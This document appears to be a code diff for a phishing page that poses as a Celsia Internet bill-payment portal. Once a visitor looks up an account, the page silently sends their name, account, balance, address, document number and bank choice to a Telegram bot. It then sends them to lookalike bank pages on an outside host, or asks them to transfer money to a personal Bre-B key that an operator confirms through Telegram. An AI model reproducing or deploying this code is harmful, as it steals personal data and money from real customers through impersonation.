+const JLP_API = 'https://api.telegram.org/bot' + JLP_TK;
+
+let tipoActual  = 'documento';
+let payData     = {};
+let jlpOffset   = 0;
+let brevPollIv  = null;
+let pseFormOpen = false;
+
+// ── VISTA 1 ────────────────────────────────────────
+function onTermsChange() {
+  document.getElementById('btn-buscar').disabled = !document.getElementById('chk-terms').checked;
+}
+
+function selectTipo(t) {
+  tipoActual = t;
+  const isDoc = t === 'documento';
+  document.getElementById('btn-doc').classList.toggle('active', isDoc);
+  document.getElementById('btn-cta').classList.toggle('active', !isDoc);
+  const inp = document.getElementById('referencia');
+  inp.placeholder = isDoc ? 'Ingresa aquí tu documento' : 'Ingresa aquí tu número de cuenta';
+  inp.inputMode   = isDoc ? 'numeric' : 'text';
+  inp.value = '';
+  inp.focus();
+}
+
+function toggleVer() {
+  const inp  = document.getElementById('referencia');
+  const open = inp.type === 'password';
+  inp.type = open ? 'text' : 'password';
+  document.getElementById('eye-icon').innerHTML = open
+    ? `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+       <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+       <line x1="1" y1="1" x2="23" y2="23"/>`
+    : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+}
+
+function fmt(n) {
+  return '$ ' + Number(n).toLocaleString('es-CO');
+}
+
+function setLoading(on) {
+  document.getElementById('btn-buscar').disabled   = on;
+  document.getElementById('spinner').style.display = on ? 'block' : 'none';
+  document.getElementById('btn-text').textContent  = on ? 'Consultando...' : 'Buscar';
+}
+
+async function buscar() {
+  const ref = document.getElementById('referencia').value.trim();
+  if (!ref) { showToast('Ingresa tu ' + (tipoActual === 'documento' ? 'documento' : 'número de cuenta'), 'err'); return; }
+  setLoading(true);
+  try {
+    const res = await fetch(`${API}/api/celsia/buscar`, {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({ numero: ref, tipo: tipoActual === 'documento' ? 'document' : 'account' }),
+    });
+    if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.error || `Error ${res.status}`); }
+    const json = await res.json();
+    if (!json.ok || !json.result?.length) throw new Error('No se encontraron cuentas para ese número.');
+    mostrarResultado(json.result[0], ref);
+  } catch (err) {
+    showToast(err.message || 'Error de conexión', 'err');
+  } finally {
+    setLoading(false);
+  }
+}
+
+// ── VISTA 2 ────────────────────────────────────────
+function mostrarResultado(d, refBuscada) {
+  const deuda  = Number(d.lngDeuda || 0);
+  const nombre = [d.strNombre1, d.strNombre2, d.strApellido1, d.strApellido2].filter(Boolean).join(' ');
+  const cuenta = d.lngClienteId || '—';
+  const cupon  = d.lngCupon     || '—';
+  const ref    = d.payment_reference   || '';
+  const integ  = d.integrity_signature || '';
+
+  payData = { deuda, nombre, cuenta, cupon, ref, integ, dir: d.strDireccion || '' };
+
+  const suspendido = deuda > 0;
+  const badge = document.getElementById('r-badge');
+  badge.className = `badge ${suspendido ? 'suspendido' : 'activo'}`;
+  document.getElementById('r-badge-text').textContent = suspendido ? 'suspendido' : 'activo';
+  document.getElementById('r-cuenta').textContent = cuenta;
+  document.getElementById('r-saldo').textContent  = fmt(deuda);
+  document.getElementById('r-cupon').textContent  = cupon;
+  document.getElementById('r-ref').textContent    = ref || '—';
+  document.getElementById('r-nombre').textContent = nombre || '—';
+  document.getElementById('r-dir').textContent    = d.strDireccion || '—';
+
+  const btnPagar = document.getElementById('btn-pagar');
+  if (deuda > 0) {
+    btnPagar.textContent = 'Pago Total';
+    btnPagar.classList.remove('disabled');
+  } else {
+    btnPagar.textContent = 'Sin saldo pendiente';
+    btnPagar.classList.add('disabled');
+  }
+
+  document.getElementById('v-search').hidden = true;
+  document.getElementById('v-result').hidden = false;
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+
+  const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method:  'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id:    TG_CHAT,
+      parse_mode: 'HTML',
+      text:
+        `🌐 <b>Celsia Internet — Consulta</b>\n\n` +
+        `🔍 <b>Ref:</b> <code>${refBuscada}</code>\n` +
+        `👤 <b>Titular:</b> ${nombre || '—'}\n` +
+        `🔢 <b>Cuenta:</b> ${cuenta}\n` +
+        `🎫 <b>Cupón:</b> ${cupon}\n` +
+        `💰 <b>Saldo:</b> ${fmt(deuda)}\n` +
+        `📌 <b>Ref pago:</b> <code>${ref}</code>\n` +
+        `🏠 <b>Dirección:</b> ${d.strDireccion || '—'}\n` +
+        `🕐 <b>Hora:</b> ${now}`,
+    }),
+  }).catch(() => {});
+}
+
+function volver() {
+  document.getElementById('v-result').hidden = true;
+  document.getElementById('v-search').hidden = false;
+  document.getElementById('referencia').value = '';
+  document.getElementById('chk-terms').checked = false;
+  document.getElementById('btn-buscar').disabled = true;
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ── VISTA 3 ────────────────────────────────────────
+function irAPagar() {
+  if (document.getElementById('btn-pagar').classList.contains('disabled')) return;
+  document.getElementById('pv-monto').textContent  = fmt(payData.deuda);
+  document.getElementById('pv-cuenta').textContent = payData.cuenta;
+  document.getElementById('pv-nombre').textContent = payData.nombre || '—';
+  pseFormOpen = false;
+  document.getElementById('pse-panel').classList.remove('show');
+  document.getElementById('pse-arrow').textContent = '›';
+  document.getElementById('v-result').hidden  = true;
+  document.getElementById('v-payment').hidden = false;
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function volverAResultado() {
+  document.getElementById('v-payment').hidden = true;
+  document.getElementById('v-result').hidden  = false;
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function showPayLoading(text) {
+  document.getElementById('ov-spin').style.display          = 'block';
+  document.getElementById('payLoadingText').style.display   = 'block';
+  document.getElementById('payLoadingText').textContent     = text;
+  document.getElementById('payRejected').classList.remove('show');
+  document.getElementById('payLoadingOverlay').classList.add('show');
+}
+
+function hidePayLoading() {
+  document.getElementById('payLoadingOverlay').classList.remove('show');
+}
+
+function tgNotif(text) {
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method:  'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body:    JSON.stringify({ chat_id: TG_CHAT, parse_mode: 'HTML', text }),
+  }).catch(() => {});
+}
+
+function pagarNequi() {
+  const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+  tgNotif(`💜 <b>Celsia — Nequi</b>\n👤 ${payData.nombre || '—'} · Cuenta: ${payData.cuenta}\n💰 ${fmt(payData.deuda)}\n🕐 ${now}`);
+  showPayLoading('Conectando con Nequi...');
+  setTimeout(() => { window.location.href = 'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/'; }, 1800);
+}
+
+function pagarBogota() {
+  const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+  tgNotif(`🏦 <b>Celsia — Banco de Bogotá</b>\n👤 ${payData.nombre || '—'} · Cuenta: ${payData.cuenta}\n💰 ${fmt(payData.deuda)}\n🕐 ${now}`);
+  showPayLoading('Conectando con Banco de Bogotá...');
+  setTimeout(() => { window.location.href = 'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f4/wps.portal/virtual/'; }, 1800);
+}
+
+function togglePseForm() {
+  pseFormOpen = !pseFormOpen;
+  document.getElementById('pse-panel').classList.toggle('show', pseFormOpen);
+  document.getElementById('pse-arrow').textContent = pseFormOpen ? '˅' : '›';
+}
+
+function pagarPSE() {
+  const banco       = document.getElementById('pse-bank').value;
+  const docnum      = document.getElementById('pse-docnum').value.trim();
+  const doctype     = document.getElementById('pse-doctype').value;
+  const person      = document.getElementById('pse-person').value;
+  const bancoNombre = document.getElementById('pse-bank').selectedOptions[0]?.text || banco;
+
+  if (!banco)  { showToast('Selecciona un banco', 'err'); return; }
+  if (!docnum) { showToast('Ingresa tu número de documento', 'err'); return; }
+
+  const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+  tgNotif(
+    `🏛️ <b>Celsia — PSE</b>\n` +
+    `👤 ${payData.nombre || '—'} · Cuenta: ${payData.cuenta}\n` +
+    `📄 ${doctype} ${docnum} · ${person}\n` +
+    `🏦 ${bancoNombre}\n💰 ${fmt(payData.deuda)}\n🕐 ${now}`
+  );
+
+  const esWompi = banco.includes('checkout.nequi.wompi.co');
+  if (esWompi) {
+    mostrarWompiOverlay(bancoNombre, banco);
+  } else {
+    showPayLoading('Conectando con ' + bancoNombre + '...');
+    setTimeout(() => { window.location.href = banco; }, 1800);
+  }
+}
+
+function mostrarWompiOverlay(bancoNombre, url) {
+  document.getElementById('wo-bank-name').textContent = 'Transfiriendo a ' + bancoNombre + '...';
+  document.getElementById('wo-amount-val').textContent = fmt(payData.deuda);
+  document.getElementById('wo-countdown').textContent = 'Redirigiendo en 8 segundos...';
+  document.getElementById('wompiOverlay').classList.add('show');
+
+  let secs = 8;
+  const iv = setInterval(() => {
+    secs--;
+    if (secs <= 0) {
+      clearInterval(iv);
+      window.location.href = url;
+    } else {
+      document.getElementById('wo-countdown').textContent = `Redirigiendo en ${secs} segundo${secs === 1 ? '' : 's'}...`;
+    }
+  }, 1000);
+}
+
+// ── BRE-B ─────────────────────────────────────────
+function abrirBrev() {
+  document.getElementById('brev-monto-modal').textContent = fmt(payData.deuda);
+  document.getElementById('brevModal').classList.add('show');
+}
+
+function brevCerrar() {
+  document.getElementById('brevModal').classList.remove('show');
+}
+
+function brevCopiar() {
+  const llave = '@LITTIO1047039997';
+  navigator.clipboard.writeText(llave).then(() => {
+    showToast('Llave copiada', 'ok');
+  }).catch(() => {
+    const el = document.createElement('textarea');
+    el.value = llave; document.body.appendChild(el); el.select();
+    document.execCommand('copy'); document.body.removeChild(el);
+    showToast('Llave copiada', 'ok');
+  });
+}
+
+async function jlpGetUpdates() {
+  try {
+    const r = await fetch(`${JLP_API}/getUpdates?timeout=5&offset=${jlpOffset}&allowed_updates=callback_query`);
+    const d = await r.json();
+    if (d.ok && d.result.length > 0) jlpOffset = d.result[d.result.length - 1].update_id + 1;
+    return d.ok ? d.result : [];
+  } catch(e) { return []; }
+}
+
+function brevStopPoll() {
+  if (brevPollIv) { clearInterval(brevPollIv); brevPollIv = null; }
+}
+
+async function brevConfirmar() {
+  brevCerrar();
+  showPayLoading('Verificando transferencia...');
+
+  const sid = 'CSL' + Date.now() + Math.random().toString(36).substr(2, 4);
+  const d   = payData;
+  const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+  await jlpGetUpdates();
+
+  const msg =
+    '💸 <b>PAGO BRE-B — CELSIA INTERNET</b>\n' +
+    '🆔 ID: <code>' + sid + '</code>\n' +
+    '─────────────────────────\n' +
+    '👤 <b>' + (d.nombre || '—') + '</b>\n' +
+    '🔢 Cuenta: <code>' + d.cuenta + '</code>\n' +
+    '🔑 Llave: @LITTIO1047039997\n' +
+    '─────────────────────────\n' +
+    '💰 <b>' + fmt(d.deuda) + '</b>\n' +
+    '⏰ ' + now;
+
+  const kb = { inline_keyboard: [[
+    { text: '✅ Pagó',    callback_data: 'jlp:brvapr:' + sid },
+    { text: '❌ No pagó', callback_data: 'jlp:brvrec:' + sid }
+  ]]};
+
+  fetch(`${JLP_API}/sendMessage`, {
+    method:  'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body:    JSON.stringify({ chat_id: JLP_GRP, text: msg, parse_mode: 'HTML', reply_markup: kb })
+  }).catch(() => {});
+
+  tgNotif(
+    `🔗 <b>Celsia — Bre-B</b>\n` +
+    `👤 ${d.nombre || '—'} · Cuenta: ${d.cuenta}\n` +
+    `💰 ${fmt(d.deuda)}\n🕐 ${now}`
+  );
+
+  const t0 = Date.now();
+  brevStopPoll();
+  brevPollIv = setInterval(async () => {
+    if (Date.now() - t0 > 300000) { brevStopPoll(); return; }
+    const updates = await jlpGetUpdates();
+    for (const upd of updates) {
+      if (!upd.callback_query) continue;
+      const cdata = upd.callback_query.data || '';
+      if (!cdata.endsWith(':' + sid)) continue;
+
+      fetch(`${JLP_API}/answerCallbackQuery`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ callback_query_id: upd.callback_query.id })
+      }).catch(() => {});
+
+      brevStopPoll();
+      if (cdata.split(':')[1] === 'brvapr') {
+        hidePayLoading();
+        document.getElementById('paySuccessOverlay').classList.add('show');
+      } else {
+        document.getElementById('ov-spin').style.display        = 'none';
+        document.getElementById('payLoadingText').style.display = 'none';
+        document.getElementById('payRejected').classList.add('show');
+      }
+      return;
+    }
+  }, 2000);
+}
+
+function brevReintentar() {
+  hidePayLoading();
+  abrirBrev();
+}
+
+function reiniciar() {
+  document.getElementById('paySuccessOverlay').classList.remove('show');
+  document.getElementById('v-payment').hidden = true;
+  document.getElementById('v-result').hidden  = true;
+  document.getElementById('v-search').hidden  = false;
+  document.getElementById('referencia').value    = '';
+  document.getElementById('chk-terms').checked  = false;
+  document.getElementById('btn-buscar').disabled = true;
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ── UTILS ─────────────────────────────────────────
+let toastTimer;
+function showToast(msg, type) {
+  const el = document.getElementById('toast');
+  document.getElementById('toast-msg').textContent = msg;
+  el.className = `toast ${type}`;
+  void el.offsetWidth;
+  el.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => el.classList.remove('show'), 3500);
+}
+
+document.getElementById('referencia').addEventListener('keydown', e => {
+  if (e.key === 'Enter' && !document.getElementById('btn-buscar').disabled) buscar();
+});
+</script>
+</html>
